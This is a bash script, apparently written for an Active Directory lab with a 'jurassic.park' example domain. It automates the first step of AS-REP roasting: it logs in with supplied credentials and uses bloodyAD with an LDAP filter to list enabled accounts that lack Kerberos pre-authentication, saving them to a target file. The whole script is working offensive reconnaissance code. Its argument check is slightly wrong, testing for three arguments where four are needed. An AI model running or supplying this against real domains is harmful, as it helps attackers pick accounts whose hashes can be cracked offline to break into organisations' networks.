#!/bin/bash
# AS-REP Roast Target Enumeration Script
# Enumerates users without Kerberos pre-authentication

set -e

if [ $# -lt 3 ]; then
    echo "Usage: $0 <domain> <username> <password> <dc_ip>"
    echo "Example: $0 jurassic.park triceratops Sh4rpH0rns 10.100.10.5"
    exit 1
fi

DOMAIN=$1
USERNAME=$2
PASSWORD=$3
DC_IP=$4
OUTPUT_FILE="asrep_targets.txt"

echo "[*] Enumerating users without pre-authentication..."
echo "[*] Domain: $DOMAIN"
echo "[*] DC: $DC_IP"

# Using bloodyAD to find users with DONT_REQ_PREAUTH flag (4194304)
# Filter: userAccountControl has 4194304 set AND is not disabled (2)
bloodyAD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --host "$DC_IP" \
    get search \
    --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' \
    --attr sAMAccountName > "$OUTPUT_FILE" 2>/dev/null

if [ -s "$OUTPUT_FILE" ]; then
    echo "[*] Found $(wc -l < "$OUTPUT_FILE") vulnerable users:"
    cat "$OUTPUT_FILE"
    echo "[*] Results saved to: $OUTPUT_FILE"
else
    echo "[!] No vulnerable users found or connection failed"
    exit 1
fi
